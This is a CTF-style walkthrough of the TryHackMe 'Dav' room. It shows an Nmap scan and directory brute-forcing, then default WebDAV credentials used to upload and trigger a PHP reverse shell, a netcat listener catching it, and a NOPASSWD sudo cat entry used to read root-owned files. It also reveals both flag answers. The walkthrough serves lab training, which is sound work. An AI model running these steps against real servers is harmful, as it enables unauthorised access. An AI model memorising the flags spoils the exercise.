# Dav — TryHackMe Walkthrough

> Boot2root machine for FIT and BSides Guatemala CTF.

<p align="center">
<a href="https://tryhackme.com/room/bsidesgtdav"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/cb525f3e7944eb5eec637698f48b6844.jpeg" alt="Dav" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/bsidesgtdav">
    <img src="https://img.shields.io/badge/TryHackMe-Dav-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-WebDAV%20%7C%20File%20Upload%20%7C%20SUID%20Misconfiguration-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | Security Misconfiguration |
| 4 | WebDAV Enumeration and Exploitation |
| 5 | Misconfigured Binaries (`sudo cat`) |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify a WebDAV-enabled web server using directory brute-forcing
- Recognise and exploit default WebDAV credentials
- Upload a PHP reverse shell via the `cadaver` WebDAV client
- Trigger an uploaded reverse shell and establish a stable interactive session
- Identify and abuse a misconfigured `sudo` entry allowing `cat` as root to read privileged files

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, dirsearch (or gobuster), cadaver, and Netcat installed
- A PHP reverse shell payload ready (e.g. pentestmonkey's `php-reverse-shell.php`)

---

## Task 1 — Read user.txt and root.txt

---

### Step 1 — Network Enumeration with Nmap

**Approach:** Run an aggressive Nmap scan with service detection, script scanning, and OS detection to identify all open ports and services.

```
kali@kali:~/CTFs/tryhackme/Dav$ sudo nmap -A -sS -sC -sV -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:09 CEST
Nmap scan report for Machine_IP
Host is up (0.046s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=80%CT=1%CU=43441%PV=Y%DS=2%DC=T%G=Y%TM=5F8706
OS:A3%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M
OS:508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%
OS:O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%
OS:DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   37.00 ms 10.8.0.1
2   37.62 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.92 seconds
```

> **Note:** Only **port 80 (HTTP)** is open, running Apache 2.4.18 on Ubuntu. The default Apache page is served at the root — meaning the interesting content is elsewhere. The next step is to enumerate directories to find hidden paths.

---

### Step 2 — Web Directory Enumeration with dirsearch

**Approach:** Brute-force the web server's directories using dirsearch with a common wordlist. Note that running dirsearch without `sudo` may cause a permission error writing to its log directory.

```
kali@kali:~/CTFs/tryhackme/Dav$ sudo /opt/dirsearch/dirsearch.py -u Machine_IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4658

Error Log: /opt/dirsearch/logs/errors-20-10-14_16-11-26.log

Target: Machine_IP

Output File: /opt/dirsearch/reports/Machine_IP/_20-10-14_16-11-26.txt

[16:11:26] Starting:
[16:11:32] 200 -   11KB - /index.html
[16:11:36] 403 -  300B  - /server-status
[16:11:38] 401 -  459B  - /webdav

Task Completed
```

> **Note:** The scan reveals `/webdav` — it returns a **401 Unauthorized** response, which means the resource exists but requires authentication. WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to read, write, and manage files on a web server. If it is using default credentials, we can authenticate and upload files directly.

---

### Step 3 — Discovering Default WebDAV Credentials

**Approach:** The `/webdav` endpoint requires credentials. Research known default credentials for WebDAV installations — particularly XAMPP-based setups. The default credentials for WebDAV under XAMPP are `wampp:xampp`. Navigating to `http://Machine_IP/webdav/passwd.dav` confirms this by revealing the stored credential hash.

The `passwd.dav` file contents:

```
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

> **Note:** The `passwd.dav` file is publicly readable — a serious misconfiguration. It contains the Apache digest auth hash for user `wampp`. Even without cracking the hash, we already know from XAMPP documentation that the default password is `xampp`. This file being accessible confirms the server is using unmodified default configuration. Reference: [XAMPP WebDAV default credentials](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html).

---

### Step 4 — Uploading a PHP Reverse Shell via cadaver

**Approach:** Use the `cadaver` command-line WebDAV client to authenticate with the default credentials and upload a PHP reverse shell. After uploading, trigger it by browsing to the file URL.

```
kali@kali:~/CTFs/tryhackme/Dav$ cadaver http://Machine_IP/webdav/
Authentication required for webdav on server `Machine_IP':
Username: wampp
Password:
dav:/webdav/> put php-reverse-shell.php
Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100.0% of 5494 bytes succeeded.
dav:/webdav/> quit
Connection to `Machine_IP' closed.
```

> **Note:** `cadaver` is a command-line WebDAV client similar to an FTP client — it provides `put`, `get`, `ls`, and other file management commands over WebDAV. The upload succeeds because the authenticated user has write permission to the WebDAV directory. Once uploaded, navigating to `http://Machine_IP/webdav/php-reverse-shell.php` in a browser will execute the PHP file and trigger the reverse shell callback. Ensure your reverse shell is configured with your own IP and listener port before uploading.

---

### Step 5 — Catching the Reverse Shell

**Approach:** Start a Netcat listener, then trigger the uploaded PHP reverse shell by browsing to its URL. Upgrade the shell to a stable interactive session using the `script` trick.

```
kali@kali:~/CTFs/tryhackme/Dav$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [YOUR_IP] from (UNKNOWN) [Machine_IP] 40106
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:16:52 up 10 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ SHELL=/bin/bash script -q /dev/null
www-data@ubuntu:/$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
merlin  wampp
www-data@ubuntu:/home$ cd /home/merlin/
cd /home/merlin/
www-data@ubuntu:/home/merlin$ ls -la
ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

> **Note:** The shell connects as `www-data` — the Apache web server user. Running `SHELL=/bin/bash script -q /dev/null` upgrades the basic `/bin/sh` to a bash session with a proper TTY, allowing job control and cleaner output. Two home directories exist: `merlin` and `wampp`. The `user.txt` file in merlin's home is world-readable (`-rw-rw-r--`), so `www-data` can read it directly.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`449b40fe93f78a938523b7e4dcd66d2a`**

</details>

---

### Step 6 — Privilege Escalation via Misconfigured sudo (cat)

**Approach:** Check what commands the current user can run via `sudo -l`. If `cat` is available without a password, it can be used to read any file on the system — including `/root/root.txt`.

```
www-data@ubuntu:/home/merlin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```

> **Note:** `www-data` is allowed to run `/bin/cat` as any user without a password. While `cat` cannot spawn a shell, it can read any file on the system as root — which is sufficient to retrieve the root flag. This is a textbook example of a **misconfigured sudo entry**. A safer configuration would restrict `cat` to a specific path or, better, not grant it at all. See [GTFOBins/cat](https://gtfobins.github.io/gtfobins/cat/#sudo) for the full abuse potential of `sudo cat`.

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`101101ddc16b0cdf65ba0b8a7af7afa5`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap aggressive scan | Found port 80 (Apache 2.4.18) as the only open port |
| 2 | dirsearch directory brute-force | Discovered `/webdav` returning 401 Unauthorized |
| 3 | Accessed `passwd.dav` and researched defaults | Confirmed default WebDAV credentials: `wampp:xampp` |
| 4 | cadaver upload via WebDAV | Uploaded `php-reverse-shell.php` to `/webdav/` |
| 5 | Triggered shell and read `user.txt` | Established `www-data` shell; retrieved user flag |
| 6 | `sudo -l` + `sudo cat /root/root.txt` | Read root flag via misconfigured NOPASSWD `cat` |
